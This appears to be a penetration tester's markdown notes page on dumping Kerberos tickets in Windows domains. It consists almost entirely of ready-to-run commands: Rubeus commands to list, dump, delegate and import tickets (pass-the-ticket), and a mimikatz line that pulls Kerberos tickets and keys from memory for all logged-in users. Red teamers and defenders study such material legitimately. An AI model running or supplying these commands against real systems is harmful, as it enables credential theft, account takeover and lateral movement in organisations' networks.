---
title: Kerberos Ticket Dump
---

[[notes/mitre-attack/credential-access|Credential Access]] by dumping Kerberos tickets.

# Unprivileged

List tickets in the current session.

=== "klist.exe"
    ~~~ bat
    klist.exe tgt
    klist.exe
    ~~~

=== "[[notes/tools/rubeus]]"
    ~~~ bat
    .\rubeus.exe klist /service:krbtgt
    .\rubeus.exe klist
    .\rubeus.exe triage
    ~~~

Dump tickets in the current session.

=== "[[notes/tools/rubeus]]"
    ~~~ bat
    .\rubeus.exe dump /nowrap /service:krbtgt
    .\rubeus.exe dump /nowrap
    ~~~

Get a RC4 TGT for the current user.

=== "[[notes/tools/rubeus]]"
    ~~~ bat
    .\rubeus.exe tgtdeleg /nowrap
    ~~~

Import a ticket into the current session.

=== "[[notes/tools/rubeus]]"
    ~~~ bat
    .\rubeus.exe ptt /ticket:%KIRBIBASE64%
    ~~~

Import a ticket into a sacrificial session.
To use it steal the token of the new process.

=== "[[notes/tools/rubeus]]"
    ~~~ bat
    .\rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:corp.local /username:jdoe /password:fake /ticket:%KIRBIBASE64%
    ~~~

# Privileged

Dump the TGTs of all logged in users.

=== "[[notes/tools/rubeus]]"
    ~~~ bat
    .\rubeus.exe dump /nowrap /service:krbtgt
    ~~~

Dump the TGTs and STs of all logged in users.

=== "[[notes/tools/rubeus]]"
    ~~~ bat
    .\rubeus.exe dump /nowrap
    ~~~

=== "[notes/tools/mimikatz]]"
    ~~~ bat
    .\mimikatz.exe privilege::debug token::elevate sekurlsa::ekeys sekurlsa::kerberos sekurlsa::tickets exit
    ~~~

Dump the TGT of a specific session.

=== "[[notes/tools/rubeus]]"
    ~~~ bat
    .\rubeus.exe triage
    .\rubeus.exe dump /service:krbtgt /luid:0x7049f
    ~~~

Untested tools:

- [TGSThief](https://github.com/MzHmO/TGSThief), request ST for other logged on users
